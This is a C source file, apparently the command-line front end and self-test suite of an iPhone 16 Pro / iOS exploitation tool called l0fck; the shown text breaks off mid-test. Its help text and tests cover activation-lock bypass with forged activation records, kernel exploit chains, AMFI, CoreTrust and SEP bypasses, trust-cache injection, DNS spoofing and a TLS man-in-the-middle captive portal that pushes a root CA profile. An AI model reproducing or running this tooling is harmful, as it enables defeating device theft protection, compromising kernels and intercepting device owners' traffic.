#include "l0fck.h"
#include "exploits/captive_server.h"
#include "exploits/captive_dns.h"
#include "exploits/captive_http.h"
#include "exploits/captive_payloads.h"
#include "exploits/captive_tls.h"
#include "exploits/device_payload.h"
#include "exploits/pmap_device_payload.h"
#include "exploits/kernel_exploit.h"
#include "exploits/bypass_chain.h"
#include "exploits/amfi_bypass.h"
#include "exploits/coretrust_bypass.h"
#include "exploits/kernel_offsets.h"
#include "exploits/appleave2_device_payload.h"
#include "exploits/sep_bypass.h"
#include "lockdown/lockdown_ssl_bypass.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>

static void print_help(const char *prog_name)
{
    target_print_banner();
    printf("Usage: %s [options]\n\n", prog_name);
    printf("Hardware Target:  iPhone 16 Pro / iPhone 16 Pro Max (A18 Pro SoC / CPID 0x8140)\n");
    printf("Software Target:  iOS 26.6.1 (Build 23G83)\n\n");
    printf("Device Discovery & Hardware Analysis:\n");
    printf("  -d, --detect                 Detect connected device, mode, SoC, and OS compatibility\n");
    printf("      --port-dfu               Inspect and parse Port DFU descriptors (PID 05ac:f014)\n");
    printf("      --usb-scan               Scan all connected Apple USB devices across modes\n");
    printf("\nLockdown & Unauthenticated Services (Vulnerability #02):\n");
    printf("      --probe-services         Audit exposed lockdown services without pairing\n");
    printf("      --afc-ls <path>          List files and directories on /var/mobile/Media/\n");
    printf("      --afc-pull <rem> <loc>   Download file from media partition to local path\n");
    printf("      --afc-push <loc> <rem>   Upload file from local path to media partition\n");
    printf("      --inject-flags           Inject persistent PurpleBuddy & hactivation bypass flags\n");
    printf("      --verify-flags           Verify injected PurpleBuddy configuration keys\n");
    printf("      --syslog [seconds]       Stream live device syslog (default 10s)\n");
    printf("      --reboot                 Safely reboot device via diagnostics relay\n");
    printf("\nMobileActivation & Albert DRM Handshake:\n");
    printf("      --probe-albert           Inspect IngestBody / CollectionBlob and test DRM handshake\n");
    printf("      --activate-online        Execute full 5-stage online activation with Albert server\n");
    printf("      --activate-offline       Generate & submit synthesized A18 Pro activation record\n");
    printf("      --activate-race          Execute VUL 23 TOCTOU race condition activation\n");
    printf("      --deactivate             Deactivate device activation state\n");
    printf("\nExploitation & Automation Modules:\n");
    printf("      --crash-preboard         Run Vulnerability #23 preboardservice_v2 crash PoC\n");
    printf("      --triage-crash           Trigger crash and auto-acquire/parse .ips crash report\n");
    printf("      --exploit-preboard       Execute weaponized preboard privilege escalation\n");
    printf("      --stage-bypass           Stage persistent PurpleBuddy/SpringBoard configs to AFC\n");
    printf("      --dismiss-setup          Dispatch Darwin setup completion notifications\n");
    printf("      --sovereign                ⚡ Execute Sovereign-Chain (Hybrid Security Degradation)\n");
    printf("      --sovereign-lite           ⚡ Execute Sovereign-Lite (Injection + Notification Focus)\n");
    printf("      --bypass-full            🚀 Execute full 5-stage automated activation bypass chain\n");
    printf("      --bypass-watch           Start automated USB bypass watcher for connected devices\n");
    printf("      --neo-chain              Execute Neo-Chain (pmap Stage 1; stages 2–5 gated on real kRW)\n");
    printf("                             NOTE: needs Setup complete + Developer Mode for .app install\n");
    printf("      --test-kernel-exploit    Test Stage 1 pmap_tte_remove kernel exploit path\n");
    printf("      --test-amfi-bypass       Test AMFI bypass (requires real kernel R/W)\n");
    printf("      --build-v047-payload     Cross-compile on-device V-047 payload (iphoneos)\n");
    printf("      --v047-ondevice <mode>   Orchestrate on-device V-047 (check|groom|fire|full)\n");
    printf("      --pull-v047-result       Pull v047_result.plist from device via AFC\n");
    printf("      --pmap-chain             Execute Pmap-Chain (pmap_tte_remove PUAF + reclaim for 26.6.1)\n");
    printf("                             NOTE: needs Setup complete + Developer Mode for .app install\n");
    printf("      --build-pmap-payload     Cross-compile pmap-tte-remove on-device payload\n");
    printf("      --pmap-ondevice <mode>   Orchestrate pmap (check|prove|reclaim|full)\n");
    printf("      --pull-pmap-result       Pull pmap_result.plist from device via AFC\n");
    printf("      --build-appleave2-payload Cross-compile AppleAVE2 iOS payload (iphoneos SDK)\n");
    printf("      --appleave2-deploy       Stage AppleAVE2 payload & AFC directory to device\n");
    printf("      --appleave2-status       Pull and display live on-device AppleAVE2 telemetry\n");
    printf("      --pull-appleave2-result  Alias for --appleave2-status\n");
    printf("      --test-lockdown-bypass   Test unauthenticated lockdown SSL bypass & traversal\n");
    printf("      --setup-assistant-chain  Setup-safe path: Soft AP → captive WebSheet JS foothold\n");
    printf("                             (no sideload; stops at JS confirm — no fake kRW/activation)\n");
    printf("      --captive-server [port]  Start local DNS/HTTP/TLS captive portal server (default 8080)\n");
    printf("      --captive-dns-port <p>   Specify DNS responder port (default 5353, use 53 with root)\n");
    printf("      --captive-tls-port <p>   Specify TLS MITM inspector port (default 8443, use 443 with root)\n");
    printf("      --captive-ip <ip>        Override spoofed DNS IP address (default auto-detected host IP)\n");
    printf("      --captive-mode <mode>    Set operating mode: intercept (default), success, redirect\n");
    printf("      --export-profile <file>  Generate and save research .mobileconfig profile\n");
    printf("\nDiagnostics & Testing:\n");
    printf("      --test                   Run embedded unit tests and synthesizer verifications\n");
    printf("  -v, --verbose                Enable detailed debug logging output\n");
    printf("  -h, --help                   Display this help documentation\n\n");
}

static uint64_t mock_cave[4] = {0};
static uint64_t s_test15_flag_written = 0;
static bool s_test15_write_called = false;

static int mock_test15_kread64(kernel_rw_primitive_t *rw, uint64_t addr, uint64_t *out)
{
    if (!rw || !out) return -1;
    uint64_t allproc_addr = KOFF_ALLPROC + rw->kslide;
    uint64_t fake_proc = 0xfffffff000200000ULL;

    if (addr == allproc_addr) {
        *out = fake_proc;
        return 0;
    }
    if (addr == fake_proc) {
        *out = 0; /* end of list */
        return 0;
    }
    if (addr >= fake_proc + KOFF_PROC_P_NAME && addr < fake_proc + KOFF_PROC_P_NAME + 64) {
        const char *name = "mobileactivationd";
        size_t off = (size_t)(addr - (fake_proc + KOFF_PROC_P_NAME));
        uint64_t chunk = 0;
        for (size_t b = 0; b < 8; b++) {
            if (off + b < strlen(name)) {
                chunk |= ((uint64_t)(unsigned char)name[off + b]) << (b * 8);
            }
        }
        *out = chunk;
        return 0;
    }

    if (addr == fake_proc + KOFF_PROC_P_FLAG) {
        *out = 0;
        return 0;
    }
    uint64_t entry_addr = KOFF_TRUST_CACHE_RT + rw->kslide;
    uint64_t cave_addr = (entry_addr - 0x4000) & ~0x3fffULL;
    if (addr >= cave_addr && addr < cave_addr + 32) {
        *out = mock_cave[(addr - cave_addr) / 8];
        return 0;
    }
    return -1;

}

static int mock_test15_kwrite64(kernel_rw_primitive_t *rw, uint64_t addr, uint64_t value)
{
    if (!rw) return -1;
    uint64_t fake_proc = 0xfffffff000200000ULL;
    if (addr == fake_proc + KOFF_PROC_P_FLAG) {
        s_test15_flag_written = value;
        s_test15_write_called = true;
        return 0;
    }

    uint64_t entry_addr = KOFF_TRUST_CACHE_RT + rw->kslide;
    uint64_t cave_addr = (entry_addr - 0x4000) & ~0x3fffULL;
    if (addr >= cave_addr && addr < cave_addr + 32) {
        mock_cave[(addr - cave_addr) / 8] = value;
        return 0;
    }
    if (addr == entry_addr) {
        return 0;
    }
    return -1;

}

typedef struct {
    uint16_t port;
    volatile bool stop;
    volatile bool received_done;
    uint64_t kbase;
    uint64_t kslide;
    uint64_t mem_keys[128];
    uint64_t mem_vals[128];
    size_t mem_count;
} test16_client_state_t;

static int test16_http_request(uint16_t port, const char *method, const char *path, const char *body, char *resp_buf, size_t resp_max)
{
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return -1;

    struct timeval tv;
    tv.tv_sec = 6;
    tv.tv_usec = 0;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    inet_pton(AF_INET, "127.0.0.1", &sin.sin_addr);

    if (connect(s, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        close(s);
        return -1;
    }

    char req[1024];
    if (body) {
        snprintf(req, sizeof(req),
                 "%s %s HTTP/1.1\r\nHost: 127.0.0.1:%u\r\nContent-Type: application/json\r\nContent-Length: %zu\r\nConnection: close\r\n\r\n%s",
                 method, path, port, strlen(body), body);
    } else {
        snprintf(req, sizeof(req),
                 "%s %s HTTP/1.1\r\nHost: 127.0.0.1:%u\r\nConnection: close\r\n\r\n",
                 method, path, port);
    }

    if (send(s, req, strlen(req), 0) < 0) {
        close(s);
        return -1;
    }

    ssize_t n = 0;
    size_t total = 0;
    while ((n = recv(s, resp_buf + total, resp_max - 1 - total, 0)) > 0) {
        total += n;
        if (total >= resp_max - 1) break;
    }
    resp_buf[total] = '\0';
    close(s);
    return (int)total;
}

static void *test16_simulated_client_thread(void *arg)
{
    test16_client_state_t *st = (test16_client_state_t *)arg;

    while (!st->stop && !st->received_done) {
        char resp[2048] = {0};
        int n = test16_http_request(st->port, "GET", "/api/krw/poll", NULL, resp, sizeof(resp));
        if (n <= 0) {
            usleep(5000);
            continue;
        }

        const char *body = strstr(resp, "\r\n\r\n");
        if (!body) continue;
        body += 4;

        if (strstr(body, "\"op\":\"idle\"") || strstr(body, "\"op\":\"none\"")) {
            continue;
        }

        if (strstr(body, "\"op\":\"done\"")) {
            st->received_done = true;
            break;
        }

        uint64_t cmd_id = 0;
        const char *p_id = strstr(body, "\"id\"");
        if (p_id) {
            const char *c = strchr(p_id, ':');
            if (c) cmd_id = strtoull(c + 1, NULL, 10);
        }

        if (strstr(body, "\"op\":\"write64\"")) {
            uint64_t addr = 0, val = 0;
            const char *pa = strstr(body, "\"addr\"");
            if (pa) {
                const char *c = strchr(pa, ':');
                if (c) {
                    while (*c == ':' || *c == ' ' || *c == '"') c++;
                    addr = strtoull(c, NULL, 16);
                }
            }
            const char *pv = strstr(body, "\"val\"");
            if (pv) {
                const char *c = strchr(pv, ':');
                if (c) {
                    while (*c == ':' || *c == ' ' || *c == '"') c++;
                    val = strtoull(c, NULL, 16);
                }
            }

            bool updated = false;
            for (size_t i = 0; i < st->mem_count; i++) {
                if (st->mem_keys[i] == addr) {
                    st->mem_vals[i] = val;
                    updated = true;
                    break;
                }
            }
            if (!updated && st->mem_count < sizeof(st->mem_keys)/sizeof(st->mem_keys[0])) {
                st->mem_keys[st->mem_count] = addr;
                st->mem_vals[st->mem_count] = val;
                st->mem_count++;
            }

            char post_body[128];
            snprintf(post_body, sizeof(post_body), "{\"id\":%llu,\"status\":\"ok\",\"val\":\"0x0\"}", (unsigned long long)cmd_id);
            test16_http_request(st->port, "POST", "/api/krw/result", post_body, resp, sizeof(resp));
        }
        else if (strstr(body, "\"op\":\"read64\"")) {
            uint64_t addr = 0;
            const char *pa = strstr(body, "\"addr\"");
            if (pa) {
                const char *c = strchr(pa, ':');
                if (c) {
                    while (*c == ':' || *c == ' ' || *c == '"') c++;
                    addr = strtoull(c, NULL, 16);
                }
            }

            uint64_t val = 0;
            bool found = false;
            for (size_t i = 0; i < st->mem_count; i++) {
                if (st->mem_keys[i] == addr) {
                    val = st->mem_vals[i];
                    found = true;
                    break;
                }
            }

            if (!found) {
                uint64_t allproc = KOFF_ALLPROC + st->kslide;
                uint64_t proc1 = st->kbase + 0x3000000ULL;
                uint64_t proc2 = st->kbase + 0x3001000ULL;
                uint64_t proc3 = st->kbase + 0x3002000ULL;
                uint64_t proc4 = st->kbase + 0x3003000ULL;

                if (addr == allproc) {
                    val = proc1;
                } else if (addr == proc1) {
                    val = proc2;
                } else if (addr == proc2) {
                    val = proc3;
                } else if (addr == proc3) {
                    val = proc4;
                } else if (addr == proc4) {
                    val = 0;
                } else if (addr >= proc1 + KOFF_PROC_P_NAME && addr < proc1 + KOFF_PROC_P_NAME + 32) {
                    size_t offset = (size_t)(addr - (proc1 + KOFF_PROC_P_NAME));
                    static const char name[] = "mobileactivationd";
                    uint64_t chunk = 0;
                    for (size_t b = 0; b < 8; b++) {
                        if (offset + b < strlen(name)) {
                            chunk |= ((uint64_t)(unsigned char)name[offset + b]) << (b * 8);
                        }
                    }
                    val = chunk;
                } else if (addr >= proc2 + KOFF_PROC_P_NAME && addr < proc2 + KOFF_PROC_P_NAME + 32) {
                    size_t offset = (size_t)(addr - (proc2 + KOFF_PROC_P_NAME));
                    static const char name[] = "Setup";
                    uint64_t chunk = 0;
                    for (size_t b = 0; b < 8; b++) {
                        if (offset + b < strlen(name)) {
                            chunk |= ((uint64_t)(unsigned char)name[offset + b]) << (b * 8);
                        }
                    }
                    val = chunk;
                } else if (addr >= proc3 + KOFF_PROC_P_NAME && addr < proc3 + KOFF_PROC_P_NAME + 32) {
                    size_t offset = (size_t)(addr - (proc3 + KOFF_PROC_P_NAME));
                    static const char name[] = "SpringBoard";
                    uint64_t chunk = 0;
                    for (size_t b = 0; b < 8; b++) {
                        if (offset + b < strlen(name)) {
                            chunk |= ((uint64_t)(unsigned char)name[offset + b]) << (b * 8);
                        }
                    }
                    val = chunk;
                } else if (addr >= proc4 + KOFF_PROC_P_NAME && addr < proc4 + KOFF_PROC_P_NAME + 32) {
                    size_t offset = (size_t)(addr - (proc4 + KOFF_PROC_P_NAME));
                    static const char name[] = "amfid";
                    uint64_t chunk = 0;
                    for (size_t b = 0; b < 8; b++) {
                        if (offset + b < strlen(name)) {
                            chunk |= ((uint64_t)(unsigned char)name[offset + b]) << (b * 8);
                        }
                    }
                    val = chunk;
                } else if (addr == proc1 + KOFF_PROC_P_FLAG || addr == proc2 + KOFF_PROC_P_FLAG ||
                           addr == proc3 + KOFF_PROC_P_FLAG || addr == proc4 + KOFF_PROC_P_FLAG) {
                    val = 0x20000000ULL;
                } else {
                    uint64_t dtBase = KOFF_GVIRT_BASE + st->kslide;
                    uint64_t ptovBase = KOFF_PTOV_TABLE + st->kslide;
                    if (addr == dtBase + 0x100ULL) {
                        val = 0x706573ULL; // "sep\0"
                    } else if (addr == dtBase + 0x120ULL) {
                        val = 0x00676572ULL; // "reg\0"
                    } else if (addr == dtBase + 0x120ULL + 36ULL) {
                        val = 0x23d0c0000ULL; // SEP MMIO physical address
                    } else if (addr == dtBase + 0x120ULL + 44ULL) {
                        val = 0x4000ULL; // SEP MMIO size
                    } else if (addr == ptovBase) {
                        val = 0x200000000ULL; // pa
                    } else if (addr == ptovBase + 8) {
                        val = 0xfffffff0d0000000ULL; // va
                    } else if (addr == ptovBase + 16) {
                        val = 0x100000000ULL; // len (covers 0x23d0c0000)
                    } else {
                        val = 0;
                    }
                }
            }

            char post_body[128];
            snprintf(post_body, sizeof(post_body), "{\"id\":%llu,\"status\":\"ok\",\"val\":\"0x%llx\"}",
                     (unsigned long long)cmd_id, (unsigned long long)val);
            test16_http_request(st->port, "POST", "/api/krw/result", post_body, resp, sizeof(resp));
        }
    }

    return NULL;
}

static int test16_bridged_kread64(kernel_rw_primitive_t *rw, uint64_t addr, uint64_t *out)
{
    if (!rw || !rw->active || !out) return -1;
    return captive_krw_read64(addr, out);
}

static int test16_bridged_kwrite64(kernel_rw_primitive_t *rw, uint64_t addr, uint64_t value)
{
    if (!rw || !rw->active) return -1;
    return captive_krw_write64(addr, value);
}

static int run_unit_tests(void)
{
    printf("\n" ANSI_COLOR_BOLD ANSI_COLOR_CYAN "======================== L0FCK SELF-TEST SUITE ========================" ANSI_COLOR_RESET "\n");
    int passed = 0;
    int total = 0;

    /* Test 1: Port DFU Serial Parser */
    total++;
    printf("Test 1: Port DFU Serial Parser... ");
    const char *test_serial = "SDOM:01 SYSI:00 BDID:0E CPID:8140 ECID:0011223344556677 SRTG:[iBoot-10158.0.0.1.1] CHIP:[T8140]";
    port_dfu_info_t dfu_info;
    memset(&dfu_info, 0, sizeof(dfu_info));
    if (port_dfu_parse_serial(test_serial, &dfu_info) == 0 &&
        dfu_info.cpid == 0x8140 &&
        dfu_info.bdid == 0x0E &&
        dfu_info.sdom == 0x01 &&
        dfu_info.sysi == 0x00 &&
        dfu_info.ecid == 0x0011223344556677ULL &&
        strcmp(dfu_info.chip, "[T8140]") == 0 &&
        dfu_info.is_a18_pro) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 2: Base64 Encoding & Decoding */
    total++;
    printf("Test 2: Base64 Codec Integrity... ");
    const char *sample_text = "Apple A18 Pro iOS 26.6.1 l0fck Activation Suite";
    size_t enc_len = 0;
    char *b64 = util_base64_encode((const unsigned char *)sample_text, strlen(sample_text), &enc_len);
    size_t dec_len = 0;
    unsigned char *dec = util_base64_decode(b64, enc_len, &dec_len);
    if (b64 && dec && dec_len == strlen(sample_text) && memcmp(dec, sample_text, dec_len) == 0) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }
    free(b64);
    free(dec);

    /* Test 3: Target Validation Logic */
    total++;
    printf("Test 3: Hardware Gating & Target Validator... ");
    l0fck_device_t mock_dev;
    memset(&mock_dev, 0, sizeof(mock_dev));
    mock_dev.cpid = TARGET_CPID;
    snprintf(mock_dev.product_type, sizeof(mock_dev.product_type), "%s", TARGET_MODEL_1);
    snprintf(mock_dev.product_version, sizeof(mock_dev.product_version), "%s", TARGET_OS_VERSION);
    snprintf(mock_dev.build_version, sizeof(mock_dev.build_version), "%s", TARGET_BUILD_VERSION);

    target_validation_status_t v_ok = target_validate_device(&mock_dev);

    mock_dev.cpid = 0x8015; /* A11 */
    target_validation_status_t v_bad_soc = target_validate_device(&mock_dev);

    if (v_ok == TARGET_VALID && v_bad_soc == TARGET_ERR_WRONG_SOC) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 4: A18 Pro Activation Record Synthesizer */
    total++;
    printf("Test 4: A18 Pro Activation Record Synthesizer... ");
    mock_dev.cpid = TARGET_CPID;
    snprintf(mock_dev.product_type, sizeof(mock_dev.product_type), "%s", TARGET_MODEL_1);
    snprintf(mock_dev.udid, sizeof(mock_dev.udid), "00008140-0011223344556677");
    mock_dev.ecid = 0x0011223344556677ULL;

    plist_t rec = NULL;
    plist_t headers = NULL;
    if (record_a18_generate(&mock_dev, NULL, &rec, &headers) == 0 && rec && headers) {
        plist_t chip_node = plist_dict_get_item(rec, "ProductType");
        char *ptype = NULL;
        plist_get_string_val(chip_node, &ptype);
        if (ptype && strcmp(ptype, TARGET_MODEL_1) == 0) {
            printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
            passed++;
        } else {
            printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
        }
        free(ptype);
        plist_free(rec);
        plist_free(headers);
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 5: DNS Query Parser & A-Record Synthesizer */
    total++;
    printf("Test 5: DNS Query Parser & Spoof Generator... ");
    /* Simulated DNS query packet for 'captive.apple.com' (Type A, Class IN, ID 0x1234) */
    uint8_t raw_dns_query[] = {
        0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x07, 'c', 'a', 'p', 't', 'i', 'v', 'e',
        0x05, 'a', 'p', 'p', 'l', 'e',
        0x03, 'c', 'o', 'm',
        0x00,
        0x00, 0x01, 0x00, 0x01
    };
    dns_query_t parsed_query;
    uint8_t resp_buf[512];
    size_t resp_len = 0;
    if (dns_parse_query(raw_dns_query, sizeof(raw_dns_query), &parsed_query) == 0 &&
        parsed_query.tx_id == 0x1234 &&
        strcmp(parsed_query.domain, "captive.apple.com") == 0 &&
        parsed_query.category == DNS_DOMAIN_APPLE_CAPTIVE &&
        dns_build_response_a(&parsed_query, "192.168.2.106", 60, resp_buf, sizeof(resp_buf), &resp_len) == 0 &&
        resp_len > sizeof(raw_dns_query)) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 6: HTTP Request Parser & Route Matcher */
    total++;
    printf("Test 6: HTTP Request Parser & Route Matcher... ");
    const char *raw_http =
        "GET /hotspot-detect.html HTTP/1.1\r\n"
        "Host: captive.apple.com\r\n"
        "User-Agent: CaptiveNetworkSupport-456.0.2 wispr\r\n"
        "Accept: */*\r\n\r\n";
    http_request_t req;
    if (http_parse_request(raw_http, strlen(raw_http), &req) == 0 &&
        strcmp(req.method, "GET") == 0 &&
        strcmp(req.path, "/hotspot-detect.html") == 0 &&
        strcmp(req.host, "captive.apple.com") == 0) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 7: Dynamic .mobileconfig Configuration Profile Generator */
    total++;
    printf("Test 7: Dynamic .mobileconfig Profile Generator... ");
    size_t profile_len = 0;
    char *profile_xml = captive_payload_generate_mobileconfig("192.168.1.50", 8080, &profile_len);
    if (profile_xml && profile_len > 0 &&
        strstr(profile_xml, "com.apple.webClip.managed") &&
        strstr(profile_xml, "com.apple.security.root") &&
        strstr(profile_xml, "http://192.168.1.50:8080/")) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 8: Root CA Certificate & PEM Validator */
    total++;
    printf("Test 8: Root CA Certificate & PEM Validator... ");
    size_t ca_len = 0;
    char *ca_pem = captive_payload_get_root_ca_pem(&ca_len);
    if (ca_pem && ca_len > 0 && strstr(ca_pem, "-----BEGIN CERTIFICATE-----") && strstr(ca_pem, "-----END CERTIFICATE-----")) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }
    free(ca_pem);

    /* Test 9: Crash Report .IPS Triage Parser */
    total++;
    printf("Test 9: Crash Report .IPS Triage Parser... ");
    const char *mock_ips =
        "{\"app_name\":\"preboardservice_v2\",\"incident_id\":\"TEST-1234-5678\",\"pid\":442}\n"
        "{\"procName\":\"preboardservice_v2\",\"exception\":{\"type\":\"EXC_CRASH\",\"signal\":\"SIGABRT\"},"
        "\"asiBacktraces\":[\"0 CoreFoundation __exceptionPreprocess + 242\\n1 libobjc.A.dylib objc_exception_throw\"]}";
    crash_triage_info_t triage_test;
    if (crash_reporter_parse_ips(mock_ips, strlen(mock_ips), &triage_test) == 0 &&
        strcmp(triage_test.incident_id, "TEST-1234-5678") == 0 &&
        strcmp(triage_test.process_name, "preboardservice_v2") == 0 &&
        triage_test.pid == 442 &&
        triage_test.is_objc_exception) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 10: SpringBoard & PurpleBuddy Preference Synthesizer */
    total++;
    printf("Test 10: SpringBoard & PurpleBuddy Preference Synthesizer... ");
    char *pb_xml = NULL;
    uint32_t pb_len = 0;
    char *sb_xml = NULL;
    uint32_t sb_len = 0;
    if (springboard_generate_purplebuddy_plist(&pb_xml, &pb_len) == 0 && pb_xml &&
        springboard_generate_springboard_plist(&sb_xml, &sb_len) == 0 && sb_xml &&
        strstr(pb_xml, "SetupFinishedAllSteps") && strstr(sb_xml, "<true/>") &&
        strstr(sb_xml, "SBShowSetupAssistantAtLaunch") && strstr(sb_xml, "<false/>")) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }
    free(pb_xml);
    free(sb_xml);

    /* Test 11: Session Manager Struct & Lifecycle Initialization */
    total++;
    printf("Test 11: Session Manager Lifecycle & Pointer Safety... ");
    l0fck_session_t test_sess;
    if (session_init(&test_sess) == 0 &&
        test_sess.dev == NULL &&
        test_sess.ld == NULL &&
        test_sess.is_connected == false &&
        sizeof(test_sess) > 0) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 12: SetupAssistant & iTunes Plist Synthesizer */
    total++;
    printf("Test 12: SetupAssistant & iTunes Plist Synthesizer... ");
    char *sa_xml = NULL;
    uint32_t sa_len = 0;
    char *it_xml = NULL;
    uint32_t it_len = 0;
    if (springboard_generate_setupassistant_plist(&sa_xml, &sa_len) == 0 && sa_xml &&
        springboard_generate_itunes_plist(&it_xml, &it_len) == 0 && it_xml &&
        strstr(sa_xml, "DidSeeLanguage") && strstr(sa_xml, "<true/>") &&
        strstr(it_xml, "BuddySetupComplete") && strstr(it_xml, "<true/>")) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }
    free(sa_xml);
    free(it_xml);

    /* Test 13: AppleAVE2 Portal Telemetry Parser & Kernel Base Validator */
    total++;
    printf("Test 13: AppleAVE2 Portal Telemetry Parser & Validator... ");
    const char *mock_ave2_json =
        "{\"driver_open\":true,\"race_attempts\":3250,\"desync_detected\":true,"
        "\"corrupted_ptr\":\"0xfffffe0018a4b000\",\"kbase\":\"0xfffffff018000000\","
        "\"krw_ready\":true,\"diagnostic\":\"Kernel pointer leak observed\"}";
    captive_appleave2_result_t ave2_test;
    if (captive_http_parse_appleave2_result(mock_ave2_json, strlen(mock_ave2_json), &ave2_test) == 0 &&
        ave2_test.driver_open &&
        ave2_test.race_attempts == 3250 &&
        ave2_test.desync_detected &&
        ave2_test.corrupted_ptr == 0xfffffe0018a4b000ULL &&
        ave2_test.kbase == 0xfffffff018000000ULL &&
        ave2_test.krw_ready &&
        strcmp(ave2_test.error_message, "Kernel pointer leak observed") == 0) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 14: SetupAssistant-Chain Post-Exploit Activation Engine */
    total++;
    printf("Test 14: SetupAssistant Activation & Force-Success Engine... ");
    captive_http_set_force_success(true);
    bool force_ok = captive_http_get_force_success();
    captive_http_set_force_success(false);

    l0fck_device_t mock_act_dev;
    memset(&mock_act_dev, 0, sizeof(mock_act_dev));
    snprintf(mock_act_dev.product_type, sizeof(mock_act_dev.product_type), "%s", TARGET_MODEL_1);
    snprintf(mock_act_dev.product_version, sizeof(mock_act_dev.product_version), "%s", TARGET_OS_VERSION);
    mock_act_dev.cpid = TARGET_CPID;

    plist_t act_rec = NULL, act_hdr = NULL;
    int gen_res = record_a18_generate_offline(&mock_act_dev, &act_rec, &act_hdr);
    bool act_ok = (gen_res == 0 && act_rec != NULL);
    if (act_rec) plist_free(act_rec);
    if (act_hdr) plist_free(act_hdr);

    if (force_ok && act_ok) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 15: Stage 6 KASLR Slide & Slid Address Calculation Test */
    total++;
    printf("Test 15: Stage 6 KASLR Slide & Slid Addressing... ");
    uint64_t test_kbase = 0xfffffff0d2000000ULL;
    uint64_t test_kslide = (test_kbase >= KOFF_KERNEL_BASE_SLIDE_HINT) ?
                           (test_kbase - KOFF_KERNEL_BASE_SLIDE_HINT) : 0;
    bool kslide_ok = (test_kslide == 0xcaffc000ULL);

    uint64_t slid_trust_cache = KOFF_TRUST_CACHE_RT + test_kslide;
    bool tc_ok = (slid_trust_cache == 0xfffffff0d2cd6b20ULL);

    uint64_t slid_allproc = KOFF_ALLPROC + test_kslide;
    bool allproc_ok = (slid_allproc == (KOFF_ALLPROC + 0xcaffc000ULL));

    /* NULL / unbridged handling without crashing */
    bool null_guard_ok = (amfi_disarm_security_daemons(NULL) == -1);

    kernel_rw_primitive_t unbridged_rw;
    memset(&unbridged_rw, 0, sizeof(unbridged_rw));
    unbridged_rw.kbase = test_kbase;
    unbridged_rw.kslide = test_kslide;
    unbridged_rw.active = false;
    bool inactive_ok = (amfi_disarm_security_daemons(&unbridged_rw) == -1);

    /* Simulated execution test with mock kread/kwrite */
    kernel_rw_primitive_t mock_rw;
    memset(&mock_rw, 0, sizeof(mock_rw));
    mock_rw.kbase = test_kbase;
    mock_rw.kslide = test_kslide;
    mock_rw.active = true;
    mock_rw.kread64 = mock_test15_kread64;
    mock_rw.kwrite64 = mock_test15_kwrite64;

    s_test15_write_called = false;
    s_test15_flag_written = 0;
    int disarm_res = amfi_disarm_security_daemons(&mock_rw);
    bool disarm_ok = (disarm_res == 0 &&
                      s_test15_write_called &&
                      (s_test15_flag_written & KOFF_P_AMFI_DISABLED) != 0);

    /* CoreTrust injection with mock kwrite */
    static const uint8_t test_hash[20] = {
        0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe,
